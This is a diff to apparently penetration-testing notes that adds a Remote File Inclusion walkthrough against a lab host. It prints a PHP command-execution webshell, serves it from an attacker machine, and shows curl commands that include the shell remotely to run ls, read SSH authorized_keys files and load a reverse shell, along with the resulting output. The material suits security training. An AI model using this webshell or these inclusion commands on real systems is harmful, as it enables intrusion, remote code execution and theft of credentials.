@@ -521,6 +521,49 @@ Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/
 ```
 http://example.com/index.php?page=http://atacker.com/mal.php
 http://example.com/index.php?page=\\attacker.com\shared\mal.php
+
+Remote File Inclusion (RFI)
+kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
+
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+
+To leverage an RFI vulnerability, we need to make the remote file accessible by the target system. 
+kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
+
+curl "http://valleys.com/comet/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
+$ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/php-reverse-shell.php&%20php%20php-reverse-shell.php"
+$ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
+
+kali@kali:/usr/share/webshells/php/$ curl "http://valleys.com/comet/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
+
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 
+
+<pre>admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+</pre>                        
+    Listing 28 - Exploiting RFI with a PHP backdoor and execution of ls
+
+Listing 28 shows that we successfully exploited an RFI vulnerability by including a remotely hosted webshell. 
+We could now use Netcat again to create a reverse shell and receive an interactive shell on the target system, as in the LFI section.
+
+$ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/php-reverse-shell.php&%20php%20php-reverse-shell.php"
+$ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/simple-backdoor.php&cmd=cat%20/home/mollie/.ssh/authorized_keys"
 ```
 
 ## Top 25 Parameters
